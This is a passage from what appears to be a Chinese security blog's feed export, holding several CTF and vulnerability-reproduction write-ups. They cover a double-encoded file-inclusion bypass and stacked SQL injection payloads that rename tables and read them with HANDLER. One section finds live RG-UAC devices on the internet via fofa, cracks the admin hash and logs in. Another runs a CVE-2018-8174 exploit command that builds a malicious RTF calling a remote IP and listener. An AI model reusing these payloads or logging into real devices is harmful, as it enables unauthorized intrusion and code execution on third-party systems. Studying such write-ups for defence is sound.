<path stroke-width="1" id="E1-MJMATHI-67" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-70" x="0" y="-213"></use>
 <use xlink:href="#E1-MJMATHI-61" x="456" y="0"></use>
 <use xlink:href="#E1-MJMATHI-67" x="985" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="1466" y="0"></use>
 <use xlink:href="#E1-MJMAIN-2C" x="1932" y="0"></use>
</g>
</svg>whitelist)) {<br>                return true;<br>            }<br>            echo “you can’t see it”;<br>            return false;<br>        }`</p>
<p>通过函数中的四个IF条件判断可以推断出输出条件</p>
<ol>
<li>第一个是判断$page变量为字符串</li>
<li>第二个是判断<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="11.188ex" height="3.343ex" style="vertical-align: -1.171ex; margin-left: -0.089ex;" viewBox="-38.5 -934.9 4817.1 1439.2" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">page变量在</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-67" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-70" x="0" y="0"></use>
 <use xlink:href="#E1-MJMATHI-61" x="503" y="0"></use>
 <use xlink:href="#E1-MJMATHI-67" x="1033" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="1513" y="0"></use>
<g transform="translate(1980,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">变</text>
</g>
<g transform="translate(2912,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">量</text>
</g>
<g transform="translate(3845,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">在</text>
</g>
</g>
</svg>whitelist数组内</li>
<li>第三个是判断截取后的<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="19.855ex" height="3.343ex" style="vertical-align: -1.171ex; margin-left: -0.089ex;" viewBox="-38.5 -934.9 8548.6 1439.2" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">page变量是否还存在</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-67" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-70" x="0" y="0"></use>
 <use xlink:href="#E1-MJMATHI-61" x="503" y="0"></use>
 <use xlink:href="#E1-MJMATHI-67" x="1033" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="1513" y="0"></use>
<g transform="translate(1980,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">变</text>
</g>
<g transform="translate(2912,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">量</text>
</g>
<g transform="translate(3845,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">是</text>
</g>
<g transform="translate(4778,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">否</text>
</g>
<g transform="translate(5711,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">还</text>
</g>
<g transform="translate(6644,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">存</text>
</g>
<g transform="translate(7577,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">在</text>
</g>
</g>
</svg>whitelist数组内，截取的是 ‘?’的部分，如果存在则返回true</li>
<li>第四个是判断url解码并截取后的<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="15.521ex" height="3.343ex" style="vertical-align: -1.171ex; margin-left: -0.089ex;" viewBox="-38.5 -934.9 6682.8 1439.2" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">page是否存在于</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-67" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-70" x="0" y="0"></use>
 <use xlink:href="#E1-MJMATHI-61" x="503" y="0"></use>
 <use xlink:href="#E1-MJMATHI-67" x="1033" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="1513" y="0"></use>
<g transform="translate(1980,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">是</text>
</g>
<g transform="translate(2912,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">否</text>
</g>
<g transform="translate(3845,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">存</text>
</g>
<g transform="translate(4778,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">在</text>
</g>
<g transform="translate(5711,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">于</text>
</g>
</g>
</svg>whitelist内，如果存在则返回true</li>
</ol>
<p><code>1.可见如果四个if判断条件都无返回值，则返回false  </code><br><code>2.四个语句中有三个语句存在返回true的条件，但是第二个语句中，用于判断$page，为必要条件</code><br><code>3.第三个语句中截取&#39;?&#39;前的部分，由于？后的部分将会解析为get方式提交参数，不能利用</code><br><code>4.第四个语句，要先进行url解码在进行截取，因此我们可以将&#39;?&#39;进行两次url编码，一次用于在提交参数时解码，一次用于check函数时解码，最终解码仍为&#39;?&#39;，仍然可以通过第四个语句判断 </code><br>``进行两次url编码-<code>&#39;%253F&#39;</code></p>
<p>构造payload:<code>?file=source.php?../ffffllllaaaagggg</code><br>转换为正确的格式：<code>?file=source.php%253F../ffffllllaaaagggg</code> 因为不知道ffffllllaaaagggg文件在哪一个目录下因此要<code>../</code>一个个添加查看<img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627200952496-f75b43aa-f90d-4b33-938d-f014b6537f73.png#align=left&display=inline&height=153&margin=%5Bobject%20Object%5D&name=image.png&originHeight=306&originWidth=1434&size=55189&status=done&style=none&width=717" alt="image.png"></p>
<p>最终的payload:<code>?file=source.php%253F../../../../../ffffllllaaaagggg</code></p>
<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627202387363-08d81a63-2109-4bef-a82d-a111a21c76c1.png#align=left&display=inline&height=148&margin=%5Bobject%20Object%5D&name=image.png&originHeight=295&originWidth=1254&size=30381&status=done&style=none&width=627" alt="image.png"><br>可以看出来这是一道很明显的注入题。。。<br>判断注入点<img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627202427904-3ccd45d0-ef84-4b67-8006-b1dfdbf0ea7f.png#align=left&display=inline&height=82&margin=%5Bobject%20Object%5D&name=image.png&originHeight=163&originWidth=1393&size=10939&status=done&style=none&width=696.5" alt="image.png"></p>
<p>可以看出来，是字符型注入，<code>单引号</code><br>判断列<img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627202513935-b1f30f6e-fc82-4b01-98b3-358ee0914cd7.png#align=left&display=inline&height=116&margin=%5Bobject%20Object%5D&name=image.png&originHeight=232&originWidth=738&size=7964&status=done&style=none&width=369" alt="image.png"></p>
<p>爆数据库<img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627202538171-0f6f7def-c520-4f78-901e-2d01c7623eeb.png#align=left&display=inline&height=81&margin=%5Bobject%20Object%5D&name=image.png&originHeight=162&originWidth=955&size=7270&status=done&style=none&width=477.5" alt="image.png"><br><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code><br>可以看到过滤了这么多，简直不是人既然这么多就不要一个个替换了，<br>尝试一下<strong>堆叠注入</strong><br><strong>查询数据库：<code>1&#39;;show databases;#</code></strong><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627202634003-36c018ca-5467-4f3e-b530-ca3fec34152a.png#align=left&display=inline&height=404&margin=%5Bobject%20Object%5D&name=image.png&originHeight=807&originWidth=620&size=22826&status=done&style=none&width=310" alt="image.png"><br>查看所有的表：<code>1&#39;;show tables;#</code><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627202673966-f03d42fa-a54a-4a4d-a4f8-ac84bf32ab23.png#align=left&display=inline&height=206&margin=%5Bobject%20Object%5D&name=image.png&originHeight=411&originWidth=608&size=11870&status=done&style=none&width=304" alt="image.png"></p>
<p>查询words表中所有列:</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627202727365-354a8596-21c9-45f5-a527-a4b589134660.png#align=left&display=inline&height=377&margin=%5Bobject%20Object%5D&name=image.png&originHeight=753&originWidth=624&size=20538&status=done&style=none&width=312" alt="image.png"></p>
<p>查询1919810931114514表中所有列<br>欸<br>看到了flag不是<img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627202779613-39346f58-40d1-46c4-859c-eb974de9cb9b.png#align=left&display=inline&height=268&margin=%5Bobject%20Object%5D&name=image.png&originHeight=535&originWidth=632&size=13735&status=done&style=none&width=316" alt="image.png"></p>
<p>那么关键不是来了！！！如何读取字段内flag呢<br>如果是一般情况：<code>select * from </code>1919810931114514<code>;#(字符串为表名操作时要加反引号)</code></p>
<p>但是select被过滤了如何绕过就成了我们需要考虑的地方了，<br>其实通过比较words和1919——-这表我们可以发现<strong>words是默认查询的表，因为查询出的结果是一个数字加一个字符串，words表结构是id和data，传入的inject参数也就是赋值给了id</strong><br><strong>问题来了，我们应该怎么做嘞：更改列名 ！</strong><br>**<br>我们将表1919810931114514名字改为words，flag列名字改为id，那么就能得到flag的内容了。<br>修改表名和列名的语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">修改表名(将表名user改为users)<br>alter table user rename to users;<br>修改列名(将字段名username改为name)<br>alter table users change uesrname name varchar(30);<br></code></pre></td></tr></table></figure>

<p>我们需要将words改为其他表名：<br><code>alter table words rename to words1;</code><br>然后将1919810931114514替换为words:<br><code>alter table </code>1919810931114514<code> rename to words;</code><br>然后将id更改为flag:<br><code>alter table words change flag id varchar(50);</code></p>
<p>payload:<code>1&#39;;alter table words rename to words1;alter table </code>1919810931114514<code> rename to words;alter table words change flag id varchar(50);#</code></p>
<p>然后用万能语句：<code>1&#39;and 1=1#</code></p>
<p>解法二：<code>1&#39;;handler </code>1919810931114514<code>open;handler</code>1919810931114514<code> read first;#</code></p>
<p>hander在数据库中是查询语句</p>
<p>handler语句的语法如下：<br><code>HANDLER tbl_name OPEN [ [AS] alias]</code><br><code>HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</code><br><code>    [ WHERE where_condition ] [LIMIT ... ]</code><br><code>HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</code><br><code>    [ WHERE where_condition ] [LIMIT ... ]</code><br><code>HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</code><br><code>    [ WHERE where_condition ] [LIMIT ... ]</code><br><code>HANDLER tbl_name CLOSE</code></p>
<p><strong>不通过索引打开查看表</strong><br>    打开句柄：<code>handler handler_table open;</code><br>    查看表数据：<code>handler handler_table read first;</code><br>    继续查看：<code>handler handler_table read next;</code><br>    关闭句柄：<code>handler handler_table close;</code><br>这就是用到的知识点，可以查看一下链接进行更多的了解：<a href="https://blog.csdn.net/JesseYoung/article/details/40785137?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1">链接</a></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2021/08/04/CNVD-2021-14536%20%E9%94%90%E6%8D%B7%20RG-UAC%20%E7%BB%9F%E4%B8%80%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>就很离谱，再看信息泄露的东西的时候，看到一篇漏洞复现的文章。。。。<br>管理员密码就在源代码里面，让我们来看看</p>
<h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>fofa搜索 <code>title=&quot;RG-UAC登录页面&quot; &amp;&amp; body=&quot;admin&quot;</code><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1625990348383-293e920b-2932-4af3-a1b5-b01fa6abe69b.png#align=left&display=inline&height=117&margin=%5Bobject%20Object%5D&name=image.png&originHeight=234&originWidth=1247&size=30174&status=done&style=none&width=623.5" alt="image.png"><br>选择一个进入环境<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1625990385404-2b8c71d1-1991-4c5a-9ed3-b861bb66c0ed.png#align=left&display=inline&height=474&margin=%5Bobject%20Object%5D&name=image.png&originHeight=947&originWidth=1920&size=314141&status=done&style=none&width=960" alt="image.png"></p>
<p>直接进入后台查看源代码😘<img src="https://cdn.nlark.com/yuque/0/2021/gif/12570963/1625990427247-cbaad5ab-55fc-45d1-a7e3-cdedfd5a604f.gif#align=left&display=inline&height=146&margin=%5Bobject%20Object%5D&originHeight=302&originWidth=302&size=0&status=done&style=none&width=146"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1625990514301-503f5101-3b54-4924-b7de-4596da1186d9.png#align=left&display=inline&height=76&margin=%5Bobject%20Object%5D&name=image.png&originHeight=151&originWidth=1858&size=18116&status=done&style=none&width=929" alt="image.png"></p>
<p>可以看到，管理员的账号密码都有，不过密码进行了md5加密，接出来不就好了吗<a href="https://www.somd5.com/">这里</a><br>进行登录。。就这样进来了</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1625990834827-148e4303-d215-4a91-818e-400997de9b5f.png#align=left&display=inline&height=462&margin=%5Bobject%20Object%5D&name=image.png&originHeight=924&originWidth=1905&size=365565&status=done&style=none&width=952.5" alt="image.png"></p>
<p>参考链接：<a href="https://www.cnblogs.com/lcxblogs/p/14502101.html">大大佬的博客</a></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2021/08/04/CTFHUB-xss(%E5%8F%8D%E5%B0%84%E5%9E%8B)/</url>
    <content><![CDATA[<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627540838269-f6255878-39b2-4b7e-a9fe-70db62d59227.png#align=left&display=inline&height=269&margin=%5Bobject%20Object%5D&name=image.png&originHeight=537&originWidth=1574&size=41871&status=done&style=none&width=787" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627540846706-32ad2456-ee5c-4ab0-9dcb-8aae2535a335.png#align=left&display=inline&height=73&margin=%5Bobject%20Object%5D&name=image.png&originHeight=145&originWidth=548&size=7236&status=done&style=none&width=274" alt="image.png"><br>经过测试，第一个文本框是用于测试使用</p>
<p>第二个文本框应该是将信息发送至后台，进行处理，</p>
<p>因此我们只能是在XSS测试平台上进行获取<br>注册成功后顺便创建一个项目，选择默认配置<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627541206024-dabbeb3a-6d3a-4a37-a5b6-ae98da949e9c.png#align=left&display=inline&height=53&margin=%5Bobject%20Object%5D&name=image.png&originHeight=106&originWidth=304&size=4258&status=done&style=none&width=152" alt="image.png"><br>成功后会给一个地址<img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627541189801-23269846-2273-43f1-ac28-71e0a3edbd2c.png#align=left&display=inline&height=162&margin=%5Bobject%20Object%5D&name=image.png&originHeight=323&originWidth=1203&size=34736&status=done&style=none&width=601.5" alt="image.png"></p>
<p>直接插入构造的url中即可<img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627541099803-dd08a972-8fb3-4262-9eb9-2a0bfe630048.png#align=left&display=inline&height=262&margin=%5Bobject%20Object%5D&name=image.png&originHeight=523&originWidth=1657&size=58399&status=done&style=none&width=828.5" alt="image.png"><br>这时会接受到一个信息<img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627541137807-e9ada91b-e10c-4e06-b4e7-06be5667f860.png#align=left&display=inline&height=214&margin=%5Bobject%20Object%5D&name=image.png&originHeight=427&originWidth=1098&size=81264&status=done&style=none&width=549" alt="image.png"></p>
<p>即可获得flag</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2021/08/04/CVE-2018-8174%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h1><p>CVE-2018-8174 是 Windows VBScript Engine 代码执行漏洞。<br>微软在4月20日早上确认此漏洞，并于5月8号发布了官方安全补丁，对该 0day 漏洞进行了修复，将其命名为 CVE-2018-8174<br>由于 VBScript 脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码</p>
<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627282558665-f69a8561-6723-4a68-8da8-009e1e9d953b.png#align=left&display=inline&height=247&margin=%5Bobject%20Object%5D&name=image.png&originHeight=493&originWidth=784&size=127118&status=done&style=none&width=392" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627283240183-5620164b-2d5b-4f8d-8b2e-61478b605957.png#align=left&display=inline&height=220&margin=%5Bobject%20Object%5D&name=image.png&originHeight=440&originWidth=649&size=134009&status=done&style=none&width=324.5" alt="image.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627285496415-19213f29-8938-4f39-8a1c-f1b12e308ecc.png#align=left&display=inline&height=211&margin=%5Bobject%20Object%5D&name=image.png&originHeight=422&originWidth=629&size=128579&status=done&style=none&width=314.5" alt="image.png"><br>这里是先创建的CVE文件<br>克隆的命令：<code>git clone https://github.com/Yt1g3r/CVE-2018-8174_EXP.git</code></p>
<p>python CVE-2018-8174.py -u <a href="http://47.103.97.200/exploit.html">http://47.103.97.200/exploit.html</a> -o msf.rtf -i 47.103.97.200 -p 19132<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627289326314-273221e0-e7e7-4a7a-96a8-5c1400d202d7.png#align=left&display=inline&height=138&margin=%5Bobject%20Object%5D&name=image.png&originHeight=276&originWidth=439&size=28288&status=done&style=none&width=219.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627289373709-c73e046c-4c48-499c-9240-33cfe4536d0c.png#align=left&display=inline&height=86&margin=%5Bobject%20Object%5D&name=image.png&originHeight=172&originWidth=925&size=46028&status=done&style=none&width=462.5" alt="image.png"><br><img 